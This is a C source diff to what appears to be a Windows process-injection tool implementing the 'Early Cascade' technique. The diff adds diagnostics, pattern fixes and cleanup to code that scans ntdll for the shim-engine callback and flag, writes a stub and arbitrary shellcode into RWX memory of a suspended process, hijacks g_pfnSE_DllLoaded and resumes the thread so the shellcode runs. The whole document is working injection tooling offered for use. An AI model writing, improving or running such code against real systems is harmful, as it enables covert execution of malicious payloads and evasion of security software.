@@ -3724,6 +3724,9 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx);
 #include <intrin.h>
 #include <string.h>
 
+// Always-on Early Cascade diagnostics (unconditional printf for failure diagnosis)
+#define LOG_EC(fmt, ...) printf("[EarlyCascade] " fmt "\n", ##__VA_ARGS__)
+
 #ifndef LOG_ERROR
 #define LOG_ERROR(fmt, ...)
 #endif
@@ -3829,15 +3832,18 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
     static BYTE pat3[] = { 0x48, 0x8B, 0x3D };
     // Win11 build 26100+: mov r13,[rel ...]
     static BYTE pat4[] = { 0x4C, 0x8B, 0x2D };
+    // Win11 23H2 variant: mov rcx,[rip+...]
+    static BYTE pat5[] = { 0x48, 0x8B, 0x0D };
 
     struct { LPBYTE pat; DWORD len; } patterns[] = {
         { pat1, sizeof(pat1) },
         { pat2, sizeof(pat2) },
         { pat3, sizeof(pat3) },
         { pat4, sizeof(pat4) },
+        { pat5, sizeof(pat5) },
     };
 
-    for (int p = 0; p < 4; p++) {
+    for (int p = 0; p < 5; p++) {
         LPBYTE pCur = (LPBYTE)textBase;
         LPBYTE pTextEnd = pCur + textSize;
         while (pCur < pTextEnd) {
@@ -3854,6 +3860,7 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
             LPVOID pResolved  = (LPVOID)(pOffsetPtr + 4 + relOffset);
             if ((ULONG_PTR)pResolved >= mrdataBase &&
                 (ULONG_PTR)pResolved < mrdataBase + mrdataSize) {
+                LOG_EC("FindSE_DllLoadedAddress: Tier-1 pattern %d matched @ %p -> %p", p, pFound, pResolved);
                 if (ppOffsetAddress) *ppOffsetAddress = pOffsetPtr;
                 return pResolved;
             }
@@ -3862,7 +3869,8 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
     }
 
     // Tier 2: RIP-relative scan — find any REX.W MOV reg,[rip+disp32] in .text
-    // whose resolved target falls in .mrdata
+    // whose resolved target falls in .mrdata AND the slot currently holds NULL
+    // (validates it is an unset function pointer, not an arbitrary data pointer)
     LPBYTE pCur = (LPBYTE)textBase;
     LPBYTE pTextEnd = pCur + textSize;
     while (pCur + 7 <= pTextEnd) {
@@ -3877,7 +3885,10 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
                     if ((ULONG_PTR)pResolved >= mrdataBase &&
                         (ULONG_PTR)pResolved < mrdataBase + mrdataSize) {
                         // Candidate: check it's an 8-byte aligned slot (function pointer)
-                        if (((ULONG_PTR)pResolved & 7) == 0) {
+                        // and the slot currently holds NULL (unset callback)
+                        if (((ULONG_PTR)pResolved & 7) == 0 &&
+                            *(ULONG_PTR*)pResolved == 0) {
+                            LOG_EC("FindSE_DllLoadedAddress: Tier-2 matched @ %p -> %p (slot=NULL)", pCur, pResolved);
                             if (ppOffsetAddress) *ppOffsetAddress = pOffsetPtr;
                             return pResolved;
                         }
@@ -3888,6 +3899,7 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
         pCur++;
     }
 
+    LOG_EC("FindSE_DllLoadedAddress: all patterns failed");
     if (ppOffsetAddress) *ppOffsetAddress = NULL;
     return NULL;
 }
@@ -3896,8 +3908,8 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
 // FindShimsEnabledAddress
 // Searches ±0xFF bytes around pDllLoadedOffsetAddress for g_ShimsEnabled.
 // Two patterns are tried (both checked against .data section):
-//   Pattern 1: C6 05  (mov byte ptr [g_ShimsEnabled], 1)  un8PcOff=5
-//   Pattern 2: 44 38 25 (cmp byte ptr [g_ShimsEnabled], r12b) un8PcOff=4
+//   Pattern 1: C6 05  (mov byte ptr [g_ShimsEnabled], 1)  pcOff=4
+//   Pattern 2: 44 38 25 (cmp byte ptr [g_ShimsEnabled], r12b) pcOff=4
 // ============================================================================
 
 LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress) {
@@ -3907,23 +3919,40 @@ LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress) {
     ULONG_PTR base    = (ULONG_PTR)hNtDLL;
     ULONG_PTR dataBase = GetNtdllSectionBase(base, ".data");   // <-- .data NOT .mrdata
     DWORD     dataSize = GetNtdllSectionSize(base, ".data");
-    if (!dataBase || !dataSize)
+    if (!dataBase || !dataSize) {
+        LOG_EC("FindShimsEnabledAddress: failed to locate .data section");
         return NULL;
+    }
 
-    // Pattern 1: C6 05 ?? ?? ?? ?? 01   mov byte ptr [g_ShimsEnabled], 1
-    // Pattern 2: 44 38 25 ?? ?? ?? ??   cmp byte ptr [g_ShimsEnabled], r12b
+    // Clamp scan window to .text section bounds to prevent underflow
+    ULONG_PTR textBase = GetNtdllSectionBase(base, ".text");
+    DWORD     textSize = GetNtdllSectionSize(base, ".text");
+    if (!textBase || !textSize) {
+        LOG_EC("FindShimsEnabledAddress: failed to locate .text section");
+        return NULL;
+    }
+    LPBYTE textStart = (LPBYTE)textBase;
+    LPBYTE textEnd   = textStart + textSize;
+
+    // Pattern 1: C6 05 ?? ?? ?? ?? 01   mov byte ptr [g_ShimsEnabled], 1  pcOff=4
+    // Pattern 2: 44 38 25 ?? ?? ?? ??   cmp byte ptr [g_ShimsEnabled], r12b  pcOff=4
     static BYTE pat1[] = { 0xC6, 0x05 };
     static BYTE pat2[] = { 0x44, 0x38, 0x25 };
 
     struct { LPBYTE pat; DWORD len; DWORD pcOff; } patterns[] = {
-        { pat1, 2, 5 },   // un8PcOff = 5: result = *(DWORD32*)(ptr) + ptr + 5
-        { pat2, 3, 4 },   // un8PcOff = 4: result = *(DWORD32*)(ptr) + ptr + 4
+        { pat1, 2, 4 },   // pcOff = 4: result = *(DWORD32*)(ptr) + ptr + 4
+        { pat2, 3, 4 },   // pcOff = 4: result = *(DWORD32*)(ptr) + ptr + 4
     };
 
     for (int p = 0; p < 2; p++) {
-        // Search ±0xFF bytes around the offset address (same as reference)
-        LPBYTE scanStart = (LPBYTE)pDllLoadedOffsetAddress - 0xFF;
-        LPBYTE scanEnd   = (LPBYTE)pDllLoadedOffsetAddress + 0xFF;
+        // Search ±0xFF bytes around the offset address, clamped to .text bounds
+        LPBYTE rawStart = (LPBYTE)pDllLoadedOffsetAddress - 0xFF;
+        LPBYTE rawEnd   = (LPBYTE)pDllLoadedOffsetAddress + 0xFF;
+        LPBYTE scanStart = rawStart < textStart ? textStart : rawStart;
+        LPBYTE scanEnd   = rawEnd   > textEnd   ? textEnd   : rawEnd;
+
+        if (scanStart >= scanEnd)
+            continue;
 
         LPBYTE pCur = scanStart;
         while (pCur < scanEnd) {
@@ -3943,6 +3972,7 @@ LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress) {
                 // Must be in .data
                 if ((ULONG_PTR)pResolved >= dataBase &&
                     (ULONG_PTR)pResolved <  dataBase + dataSize) {
+                    LOG_EC("FindShimsEnabledAddress: pattern %d matched @ %p -> %p", p, pFound, pResolved);
                     return pResolved;
                 }
             }
@@ -3951,21 +3981,24 @@ LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress) {
         }
     }
 
+    LOG_EC("FindShimsEnabledAddress: all patterns failed");
     return NULL;
 }
 
 // ============================================================================
-// EncodeSystemPtr - Encode using RtlEncodeSystemPointer (version-safe)
+// EncodeSystemPtr - Encode using RtlEncodePointer (version-safe)
+// RtlEncodePointer uses SharedUserData cookie on all Windows versions,
+// matching the encoding used by g_pfnSE_DllLoaded slot.
 // ============================================================================
 
-typedef PVOID (NTAPI *pfn_RtlEncodeSystemPointer)(PVOID);
+typedef PVOID (NTAPI *pfn_RtlEncodePointer)(PVOID);
 
 LPVOID EncodeSystemPtr(LPVOID ptr) {
-    // Use RtlEncodeSystemPointer — the documented, version-safe API
+    // Use RtlEncodePointer — uses SharedUserData cookie on all versions
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (hNtdll) {
-        pfn_RtlEncodeSystemPointer pEncode =
-            (pfn_RtlEncodeSystemPointer)GetProcAddress(hNtdll, "RtlEncodeSystemPointer");
+        pfn_RtlEncodePointer pEncode =
+            (pfn_RtlEncodePointer)GetProcAddress(hNtdll, "RtlEncodePointer");
         if (pEncode)
             return pEncode(ptr);
     }
@@ -4111,6 +4144,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
         // Step 2: Ensure target is x64 (not WOW64)
         if (IsWow64Process(pi.hProcess, &bIsWow64) && bIsWow64) {
             LOG_ERROR("EarlyCascade: Target is WOW64 — x64 only");
+            LOG_EC("Step 2 failed: target process is WOW64 (x64 only supported)");
             break;
         }
 
@@ -4119,25 +4153,31 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
         hNtDLL = GetModuleHandleA("ntdll.dll");
         if (!hNtDLL) {
             LOG_ERROR("EarlyCascade: GetModuleHandleA(ntdll.dll) failed");
+            LOG_EC("Step 3 failed: GetModuleHandleA(ntdll.dll) returned NULL");
             break;
         }
         LOG_INFO("EarlyCascade: ntdll @ 0x%p", hNtDLL);
+        LOG_EC("Step 3 OK: ntdll base = %p", hNtDLL);
 
         // Step 4: Find g_pfnSE_DllLoaded
         pSE_DllLoadedAddress = FindSE_DllLoadedAddress(hNtDLL, &pOffsetAddress);
         if (!pSE_DllLoadedAddress || !pOffsetAddress) {
             LOG_ERROR("EarlyCascade: FindSE_DllLoadedAddress failed");
+            LOG_EC("Step 4 failed: FindSE_DllLoadedAddress returned NULL");
             break;
         }
         LOG_INFO("EarlyCascade: g_pfnSE_DllLoaded @ 0x%p", pSE_DllLoadedAddress);
+        LOG_EC("Step 4 OK: g_pfnSE_DllLoaded @ %p, offsetAddr @ %p", pSE_DllLoadedAddress, pOffsetAddress);
 
         // Step 5: Find g_ShimsEnabled
         pShimsEnabledAddress = FindShimsEnabledAddress(hNtDLL, pOffsetAddress);
         if (!pShimsEnabledAddress) {
             LOG_ERROR("EarlyCascade: FindShimsEnabledAddress failed");
+            LOG_EC("Step 5 failed: FindShimsEnabledAddress returned NULL");
             break;
         }
         LOG_INFO("EarlyCascade: g_ShimsEnabled @ 0x%p", pShimsEnabledAddress);
+        LOG_EC("Step 5 OK: g_ShimsEnabled @ %p", pShimsEnabledAddress);
 
         // Step 6: Allocate remote memory for stub + shellcode (RWX)
         SIZE_T totalSize = (SIZE_T)g_CascadeStubSize + pCtx->dwShellcodeSize;
@@ -4146,14 +4186,17 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
                                         PAGE_EXECUTE_READWRITE);
         if (!pRemoteBuffer) {
             LOG_ERROR("EarlyCascade: VirtualAllocEx failed (%lu)", GetLastError());
+            LOG_EC("Step 6 failed: VirtualAllocEx error %lu", GetLastError());
             break;
         }
         LOG_INFO("EarlyCascade: Remote buffer @ 0x%p (%llu bytes)", pRemoteBuffer, (ULONGLONG)totalSize);
+        LOG_EC("Step 6 OK: remote buffer @ %p (%llu bytes)", pRemoteBuffer, (ULONGLONG)totalSize);
 
         // Step 7: Make a local copy of the stub and patch placeholder
         LPBYTE pStubCopy = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_CascadeStubSize);
         if (!pStubCopy) {
             LOG_ERROR("EarlyCascade: HeapAlloc for stub copy failed");
+            LOG_EC("Step 7 failed: HeapAlloc returned NULL");
             break;
         }
         memcpy(pStubCopy, g_CascadeStub, g_CascadeStubSize);
@@ -4164,57 +4207,77 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
             g_StubPlaceholder, (DWORD)sizeof(g_StubPlaceholder));
         if (!pPlaceholder) {
             LOG_ERROR("EarlyCascade: Could not find placeholder in stub");
+            LOG_EC("Step 7 failed: placeholder 0x11*8 not found in stub");
             HeapFree(GetProcessHeap(), 0, pStubCopy);
             break;
         }
         memcpy(pPlaceholder, &pShimsEnabledAddress, sizeof(LPVOID));
         LOG_INFO("EarlyCascade: Patched stub placeholder with pShimsEnabled=0x%p", pShimsEnabledAddress);
+        LOG_EC("Step 7 OK: stub patched with g_ShimsEnabled=%p", pShimsEnabledAddress);
 
         // Step 8: Write stub into remote process
         if (!WriteProcessMemory(pi.hProcess, pRemoteBuffer,
                                  pStubCopy, g_CascadeStubSize, NULL)) {
             LOG_ERROR("EarlyCascade: WriteProcessMemory (stub) failed (%lu)", GetLastError());
+            LOG_EC("Step 8 failed: WriteProcessMemory (stub) error %lu", GetLastError());
             HeapFree(GetProcessHeap(), 0, pStubCopy);
             break;
         }
         HeapFree(GetProcessHeap(), 0, pStubCopy);
         LOG_INFO("EarlyCascade: Stub written successfully");
+        LOG_EC("Step 8 OK: stub written to remote process");
 
         // Step 9: Write shellcode right after the stub
         LPVOID pRemoteShellcode = (LPVOID)((DWORD_PTR)pRemoteBuffer + g_CascadeStubSize);
         if (!WriteProcessMemory(pi.hProcess, pRemoteShellcode,
                                  pCtx->pShellcode, pCtx->dwShellcodeSize, NULL)) {
             LOG_ERROR("EarlyCascade: WriteProcessMemory (shellcode) failed (%lu)", GetLastError());
+            LOG_EC("Step 9 failed: WriteProcessMemory (shellcode) error %lu", GetLastError());
             break;
         }
         LOG_INFO("EarlyCascade: Shellcode written @ 0x%p", pRemoteShellcode);
+        LOG_EC("Step 9 OK: shellcode written @ %p", pRemoteShellcode);
 
         // Step 10: Encode stub pointer and write to g_pfnSE_DllLoaded
         pEncodedStubAddr = EncodeSystemPtr(pRemoteBuffer);
         LOG_INFO("EarlyCascade: Encoded stub ptr = 0x%p", pEncodedStubAddr);
+        LOG_EC("Step 10: encoded stub ptr = %p", pEncodedStubAddr);
 
         if (!WriteProcessMemory(pi.hProcess, pSE_DllLoadedAddress,
                                  &pEncodedStubAddr, sizeof(LPVOID), NULL)) {
             LOG_ERROR("EarlyCascade: WriteProcessMemory (g_pfnSE_DllLoaded) failed (%lu)", GetLastError());
+            LOG_EC("Step 10 failed: WriteProcessMemory (g_pfnSE_DllLoaded) error %lu", GetLastError());
             break;
         }
         LOG_INFO("EarlyCascade: g_pfnSE_DllLoaded hijacked");
+        LOG_EC("Step 10 OK: g_pfnSE_DllLoaded hijacked");
 
         // Step 11: Enable the Shim Engine in the target process
         if (!WriteProcessMemory(pi.hProcess, pShimsEnabledAddress,
                                  &bEnable, sizeof(BOOL), NULL)) {
             LOG_ERROR("EarlyCascade: WriteProcessMemory (g_ShimsEnabled) failed (%lu)", GetLastError());
+            LOG_EC("Step 11 failed: WriteProcessMemory (g_ShimsEnabled) error %lu", GetLastError());
             break;
         }
         LOG_INFO("EarlyCascade: g_ShimsEnabled set to TRUE");
+        LOG_EC("Step 11 OK: g_ShimsEnabled set to TRUE");
 
         // Step 12: Resume — the Shim Engine fires on first DLL load, executing our stub
         if (!ResumeThread(pi.hThread)) {
             LOG_ERROR("EarlyCascade: ResumeThread failed (%lu)", GetLastError());
+            LOG_EC("Step 12 failed: ResumeThread error %lu", GetLastError());
             break;
+        }
+        LOG_EC("Step 12 OK: thread resumed, waiting for stub execution...");
+
+        // Wait for the stub to run (up to 5 seconds)
+        {
+            DWORD dwWait = WaitForSingleObject(pi.hProcess, 5000);
+            LOG_EC("WaitForSingleObject result: %lu (WAIT_OBJECT_0=0, WAIT_TIMEOUT=258)", dwWait);
         }
 
         LOG_SUCCESS("EarlyCascade: Injection successful!");
+        LOG_EC("Injection successful!");
         pCtx->hProcess   = pi.hProcess;
         pCtx->hThread    = pi.hThread;
         pCtx->pRemoteBase = pRemoteBuffer;
@@ -4225,9 +4288,15 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
 
     if (!bSuccess) {
         LOG_ERROR("EarlyCascade: Failed — killing target process");
-        if (pi.hProcess) TerminateProcess(pi.hProcess, 0);
-        if (pi.hThread)  CloseHandle(pi.hThread);
-        if (pi.hProcess) CloseHandle(pi.hProcess);
+        LOG_EC("Injection failed — terminating target process and cleaning up handles");
+        if (pRemoteBuffer && pi.hProcess)
+            VirtualFreeEx(pi.hProcess, pRemoteBuffer, 0, MEM_RELEASE);
+        if (pi.hProcess) {
+            TerminateProcess(pi.hProcess, 0);
+            CloseHandle(pi.hProcess);
+        }
+        if (pi.hThread)
+            CloseHandle(pi.hThread);
     }
 
     return bSuccess;
